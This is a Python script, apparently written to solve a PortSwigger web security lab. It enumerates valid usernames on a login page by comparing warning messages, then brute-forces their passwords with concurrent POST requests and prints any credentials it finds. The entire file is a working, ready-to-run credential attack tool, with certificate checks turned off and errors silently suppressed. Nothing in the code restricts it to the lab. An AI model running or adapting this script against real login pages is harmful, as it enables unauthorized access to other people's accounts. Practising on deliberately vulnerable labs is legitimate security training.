#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import os
import sys

from bs4 import BeautifulSoup


def check_input_file(input_file: str) -> None:
    """Check if the input file exists and is readable."""

    if not os.path.isfile(input_file):
        sys.stdout.write(f"Error: Input file '{input_file}' does not exist.\n")
        sys.exit(1)
    if not os.access(input_file, os.R_OK):
        sys.stdout.write(f"Error: Input file '{input_file}' is not readable.\n")
        sys.exit(1)
    if not input_file.lower().endswith(".txt"):
        sys.stdout.write("Error: Input file must be a .txt file.\n")
        sys.exit(1)


def extract_tag(content: str):
    """Extracts the warning message from the login response."""
    soup = BeautifulSoup(content, "html.parser")
    warning_tag = soup.find("p", class_="is-warning")
    if warning_tag:
        return warning_tag.get_text()
    return None


async def enumerate_username(
    client: aiohttp.ClientSession,
    url: str,
    payload_file: str,
    concurrency: int = 15,
):
    """Asynchronously enumerates usernames and returns a list of valid ones."""
    payloads = []

    try:
        with open(payload_file, "r") as f:
            payloads = [line.strip() for line in f]
    except Exception as e:
        print(f"[-] Error reading payload file: {e}")
        return []

    valid_usernames = []
    semaphore = asyncio.Semaphore(concurrency)

    async def check_username(username):
        """Asynchronously checks a single username."""
        async with semaphore:
            data = {"username": username, "password": "password"}
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            try:
                async with client.post(
                    url, headers=headers, data=data, allow_redirects=False, ssl=False
                ) as res:
                    text = await res.text()
                    tag_text = extract_tag(text)
                    if tag_text and "Invalid username" not in tag_text:
                        print(f"[+] Valid username: {username} (response: '{tag_text}')")
                        valid_usernames.append(username)
            except aiohttp.ClientConnectorError:
                pass  # silently ignore connection / SSL errors
            except aiohttp.ClientError as e:
                print(f"[-] Error checking {username}: {e}")

    tasks = [check_username(username) for username in payloads]
    await asyncio.gather(*tasks)

    return valid_usernames


async def bruteforce_password(
    client: aiohttp.ClientSession,
    url: str,
    username: str,
    payload_file: str,
    concurrency: int = 15,
):
    """Asynchronously brute-forces the password for a given username."""
    payloads = []

    try:
        with open(payload_file, "r") as f:
            payloads = [line.strip() for line in f]
    except Exception as e:
        print(f"[-] Error reading payload file: {e}")
        return

    found = False
    semaphore = asyncio.Semaphore(concurrency)

    async def check_password(password):
        """Asynchronously checks a single password."""
        nonlocal found
        if found:
            return

        async with semaphore:
            data = {"username": username, "password": password}
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            try:
                async with client.post(
                    url, headers=headers, data=data, allow_redirects=False, ssl=False
                ) as res:
                    if res.status == 302:
                        print(f"[+] Valid password: {password}")
                        print(f"[+] Credentials found: {username}:{password}")
                        found = True
            except aiohttp.ClientConnectorError:
                pass  # silently ignore connection / SSL errors
            except aiohttp.ClientError as e:
                print(f"[-] Error checking password '{password}': {e}")

    tasks = [check_password(password) for password in payloads]
    await asyncio.gather(*tasks)

    if not found:
        print(f"[-] No valid password found for '{username}'.")


async def main():
    """Main asynchronous function."""
    parser = argparse.ArgumentParser(
        description="Solve Lab: Username enumeration via different responses."
    )
    parser.add_argument(
        "-u",
        "--url",
        type=str,
        required=True,
        help="URL of the PortSwigger lab login page.",
    )
    parser.add_argument(
        "-uname",
        "--usernames",
        type=str,
        required=False,
        help="Path to the usernames wordlist.",
        default="wordlist/usernames.txt",
    )
    parser.add_argument(
        "-pass",
        "--passwords",
        type=str,
        required=False,
        help="Path to the passwords wordlist.",
        default="wordlist/passwords.txt",
    )

    args = parser.parse_args()
    url = args.url.strip()
    usernames_file = args.usernames.strip()
    passwords_file = args.passwords.strip()

    # Check if files exist
    check_input_file(usernames_file)
    check_input_file(passwords_file)

    async with aiohttp.ClientSession(trust_env=True) as client:
        # Step 1: Enumerate valid usernames
        print("[*] Starting username enumeration...")
        valid_usernames = await enumerate_username(
            client,
            url=url,
            payload_file=usernames_file,
        )

        if not valid_usernames:
            print("[-] No valid usernames found. Exiting.")
            return

        # Step 2: Brute-force password for each found username
        print(f"\n[*] Starting password brute-force for {len(valid_usernames)} username(s)...")
        for username in valid_usernames:
            print(f"\n[*] Trying passwords for '{username}'...")
            await bruteforce_password(
                client,
                url=url,
                username=username,
                payload_file=passwords_file,
            )


if __name__ == "__main__":
    asyncio.run(main())
